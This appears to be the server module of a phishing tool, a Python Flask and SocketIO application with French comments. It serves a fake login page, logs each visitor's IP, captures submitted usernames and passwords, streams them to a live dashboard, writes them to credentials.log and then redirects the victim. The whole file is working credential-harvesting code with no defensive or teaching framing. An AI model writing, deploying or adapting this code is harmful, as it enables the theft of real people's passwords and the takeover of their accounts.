from flask import Flask, render_template_string, request, redirect, render_template
from flask_socketio import SocketIO
import os
from datetime import datetime
import threading

# On crée une instance de SocketIO qui sera utilisée par l'application
socketio = SocketIO()

def create_app(config):
    """
    Crée et configure l'application Flask et SocketIO.
    Cette fonction 'factory' est une bonne pratique pour les projets Flask.
    """
    app = Flask(__name__, template_folder=os.path.abspath('templates'))
    app.config['SECRET_KEY'] = 'humanghost-secret-key!' # Nécessaire pour SocketIO
    
    # Page de phishing principale
    @app.route("/")
    def index():
        # Log de l'événement de visite
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        socketio.emit('update', {
            'timestamp': timestamp,
            'type': 'event',
            'event': 'Visite de la page',
            'details': f"IP: {request.remote_addr}"
        })
        
        with open(os.path.join(app.template_folder, config['server']['template']), "r") as f:
            template_content = f.read()
        return render_template_string(template_content)

    # Route pour capturer les identifiants
    @app.route("/login", methods=['POST'])
    def login():
        username = request.form.get('username')
        password = request.form.get('password')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        log_line = f"Username: {username}, Password: {password}"
        print(f"[+] Identifiants capturés : {log_line}")

        # Envoi de l'événement au tableau de bord via WebSocket
        socketio.emit('update', {
            'timestamp': timestamp,
            'type': 'credential',
            'event': 'Identifiants Capturés',
            'details': log_line
        })

        # Enregistrement dans le fichier de log
        with open("credentials.log", "a") as log_file:
            log_file.write(f"[{timestamp}] - {log_line} (IP: {request.remote_addr})\n")
            
        return redirect(config['server']['redirect_url'])

    # Route pour le tableau de bord
    @app.route("/dashboard")
    def dashboard():
        return render_template("dashboard.html")

    # Initialisation de l'application avec SocketIO
    socketio.init_app(app)
    return app

def run_server_in_thread(config):
    """
    Lance le serveur Flask dans un thread séparé pour ne pas bloquer
    l'exécution du script principal.
    """
    app = create_app(config)
    host = config['server'].get('host', '0.0.0.0')
    port = config['server'].get('port', 5000)
    
    print(f"[*] Faux site accessible sur http://{host}:{port}")
    print(f"[*] Tableau de bord accessible sur http://{host}:{port}/dashboard")
    
    # Utilisation de socketio.run() au lieu de app.run()
    server_thread = threading.Thread(target=socketio.run, args=(app,), kwargs={'host': host, 'port': port, 'allow_unsafe_werkzeug': True})
    server_thread.daemon = True # Permet au script principal de se terminer même si le thread tourne
    server_thread.start()
    return server_thread
